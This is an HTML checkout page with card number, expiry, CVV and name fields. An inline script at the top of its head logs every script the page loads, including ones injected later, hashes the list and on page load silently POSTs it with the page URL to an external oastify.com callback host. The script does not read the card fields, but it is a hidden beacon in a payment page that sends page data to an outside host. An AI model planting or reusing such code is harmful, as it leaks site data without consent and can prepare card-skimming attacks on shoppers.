<!DOCTYPE html>
<html lang="en">
<head>
   <script>

const scriptMeta = new Map();

function captureScript(node) {
  if (node.nodeName === 'SCRIPT' && node.src) {
    scriptMeta.set(node.src, {
      url: node.src,
      integrity: node.getAttribute('integrity') || null,
      crossorigin: node.getAttribute('crossorigin') || null
    });
  }
}

// Grab what's already in DOM
document.querySelectorAll('script[src]').forEach(s => captureScript(s));

// Watch for anything injected later
new MutationObserver(mutations => {
  mutations.forEach(m => {
    m.addedNodes.forEach(node => captureScript(node));
  });
}).observe(document.documentElement, { childList: true, subtree: true });

// Generate a fingerprint of the current script inventory
async function hashScripts(scripts) {
  const str = JSON.stringify(scripts.sort((a, b) => a.url.localeCompare(b.url)));
  const buffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
  return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, '0')).join('');
}

const MAX_SCRIPTS   = 100;    // bail if script count looks unreasonable
const MAX_BYTES     = 50000;  // 50KB payload cap

window.addEventListener('load', async () => {
  const scripts = [...scriptMeta.values()];

  // Guard 1: too many scripts — likely broken or tampered page
  if (scripts.length > MAX_SCRIPTS) {
    console.warn(`[collector] aborted — script count ${scripts.length} exceeds limit`);
    return;
  }

  const fingerprint = await hashScripts(scripts);

  const payload = JSON.stringify({
    page: window.location.href,
    fingerprint,
    scripts,
    ts: Date.now()
  });

  // Guard 2: payload too large
  if (payload.length > MAX_BYTES) {
    console.warn(`[collector] aborted — payload size ${payload.length} bytes exceeds limit`);
    return;
  }

  fetch('https://0nokywbevarydes1ipi5qw1vvm1dp3ds.oastify.com/collect', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: payload,
    keepalive: true
  }).catch(err => {
    console.warn('[collector] fetch failed:', err.message);
  });
});
       
    </script>
    <meta charset="UTF-8">
    <title>Payment Page</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h2>Payment Page</h2>
        <button id="darkModeToggle">Toggle Dark Mode</button>
        <button id="resetForm">Reset Form</button>
        <form id="paymentForm">
            <div>
                <label for="cardNumber">Card Number:</label>
                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required>
                <div class="error" id="cardNumberError">Invalid card number (must be 16 digits).</div>
            </div>
            <div>
                <label for="expiryDate">Expiration Date:</label>
                <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
                <div class="error" id="expiryDateError">Invalid expiration date (must be MM/YY and a future date).</div>
            </div>
            <div>
                <label for="cvv">CVV:</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" required>
                <div class="error" id="cvvError">Invalid CVV (must be 3 or 4 digits).</div>
            </div>
            <div>
                <label for="name">Name on Card:</label>
                <input type="text" id="name" name="name" placeholder="John Doe" required>
                <div class="error" id="nameError">Invalid name (must contain only alphabetic characters).</div>
            </div>
            <button type="submit">Submit Payment</button>
        </form>
        <div id="successMessage" class="success">Payment successful!</div>
    </div>

    <script src="script.js"></script>
    <script src="darkMode.js"></script>
    <script src="formReset.js"></script>
    <script src="inputMasking.js"></script>
</body>
</html>
